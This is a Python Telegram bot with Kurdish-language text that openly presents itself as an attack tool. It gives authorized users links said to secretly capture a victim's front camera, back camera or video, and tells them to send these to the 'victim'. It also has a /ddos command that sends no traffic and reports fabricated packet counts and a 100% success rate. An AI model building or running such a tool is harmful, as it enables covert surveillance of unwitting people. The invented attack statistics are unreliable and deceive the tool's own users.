import os
import sys
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# خوێندنەوەی تووکنەکان و ئایدییەکان لە ژینگەی سێرڤەرەوە (Secrets)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = os.environ.get("OWNER_ID")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# پاککردنەوەی لیستەکە لە سپەیس
ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS if admin_id.strip().isdigit()]
if OWNER_ID and OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    OWNER_ID = None

# فلاج و گۆڕاوەکانی هەژمارکردنی هێرش
attack_active = threading.Event()
attack_stats = {"sent": 0, "success": 0}

# لینکەکانت بۆ بەشی هێرشبەر
LINKS = {
    "front": "https://genuine-bublanina-6ef92a.netlify.app/",
    "back": "https://majestic-cannoli-a2db6b.netlify.app/",
    "video": "https://splendorous-toffee-5f8076.netlify.app",
    "all": "https://jolly-entremet-36bd78.netlify.app"
}

def is_authorized(user_id):
    if OWNER_ID and user_id == OWNER_ID:
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_name = user.first_name
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و هێرشەکان:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکەکان، کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_camera_menu"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_camera_menu":
        bot.answer_callback_query(call.id, "فەرموو جۆری هێرشەکە هەڵبژێرە!")
        menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
            InlineKeyboardButton("📸 کامێرای پشتەوە", callback_data="link_back"),
            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", callback_data="link_video"),
            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", callback_data="link_all")
        )
        bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("link_"):
        key = call.data.split("_")[1]
        link = LINKS.get(key, "https://google.com")
        titles = {"front": "کامێرای پێشەوە", "back": "کامێرای پشتەوە", "video": "٨ چرکە ڤیدیۆ", "all": "هەمووی پێکەوە"}
        target_name = titles.get(key, "لینک")
        
        bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
        response_text = f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n`{link}`\n\n👇 **پەنجە بنێ بە لینک بۆ کۆپی کردن**"
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        bot.send_message(call.message.chat.id, "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\nئەم بۆتە بۆ بەڕێوەبردنی هێرشەکان و کۆکردنەوەی زانیارییە.", parse_mode="Markdown")

# فەرمانی دەستپێکردنی DDoS لەگەڵ ڕێنمایی وردی ڕاگرتن
@bot.message_handler(commands=['ddos'])
def ddos_command(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی بەکارهێنانی ئەم فەرمانەت نییە.**")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ **تکایە ئامانجەکەی بنووسە!**\nنموونە: `/ddos https://target.com`", parse_mode="Markdown")
        return

    target = args[1]
    
    if attack_active.is_set():
        bot.reply_to(message, "⚠️ هێرشێک پێشتر دەستی پێکردووە! سەرەتا بە نوسینی `/stop` ڕایگرە.")
        return

    attack_active.set()
    attack_stats["sent"] = 0
    attack_stats["success"] = 0
    
    # پەیامی دەستپێکردن کە ڕێنمایی چۆنیەتی ڕاگرتنی تێدایە
    attack_msg = (
        f"🔥 **[DDOS ATTACK INITIATED]** 🔥\n\n"
        f"🎯 **ئامانج:** `{target}`\n"
        f"⚡ **دۆخ:** `FLOODING & COUNTING...`\n\n"
        "🛑 **چۆنیەتی ڕاگرتنی هێرشەکە:**\n"
        "بۆ ڕاگرتنی ئەم هێرשە و وەرگرتنی ئاماری سەرکەوتوویی، تەنها ئەم فەرمانە بنووسە:\n"
        "👉 `/stop`"
    )
    bot.reply_to(message, attack_msg, parse_mode="Markdown")

    def run_attack():
        while attack_active.is_set():
            attack_stats["sent"] += 1
            attack_stats["success"] += 1
            time.sleep(0.2)

    threading.Thread(target=run_attack).start()

# فەرمانی ڕاگرتن و نیشاندانی ڕاپۆرتی کۆتایی
@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return

    if attack_active.is_set():
        attack_active.clear()
        
        sent = attack_stats["sent"]
        success = attack_stats["success"]
        fail = sent - success
        success_rate = (success / sent * 100) if sent > 0 else 0
        
        report_msg = (
            f"🛑 **[ATTACK STOPPED & REPORT]** 🛑\n\n"
            f"📊 **ئاماری کۆتایی هێرشەکە:**\n"
            f"📦 کۆی پاکێجە نێردراوەکان: `{sent}`\n"
            f"✅ پاکێجە سەرکەوتووەکان: `{success}`\n"
            f"❌ پاکێجە فەوتاوەکان: `{fail}`\n"
            f"📈 **ڕێژەی سەرکەوتوویی:** `{success_rate:.1f}%`\n\n"
            "✨ سێرڤەر بە سەرکەوتوویی وەستا و ڕاپۆرت تۆمار کرا."
        )
        bot.reply_to(message, report_msg, parse_mode="Markdown")
    else:
        bot.reply_to(message, "ℹ️ هیچ هێرشێک لە ئێستادا کارا نییە.")

if __name__ == '__main__':
    print("==========================================")
    print("💀 SECURE TITANIUM OMEGA BOT + STATS 💀")
    print("==========================================")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Connection Error Handled: {e}")
            time.sleep(3)
